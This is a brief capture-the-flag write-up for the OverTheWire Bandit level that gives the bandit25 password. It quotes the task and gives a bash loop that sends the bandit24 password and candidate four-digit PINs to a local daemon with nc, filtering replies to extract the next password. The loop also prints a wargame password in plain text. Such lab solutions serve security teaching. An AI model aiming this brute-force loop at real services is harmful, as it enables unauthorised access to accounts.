Task on Overthewire: http://overthewire.org/wargames/bandit/bandit25.html

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

for x in 56{6..7}{0..9}; do
	  echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $x | nc 127.0.0.1 30002 | egrep -v  "Exiting|Wrong|I am|Correct!" | sed "s/The password of user bandit25 is //";
	  echo "Try $x"; 
	done
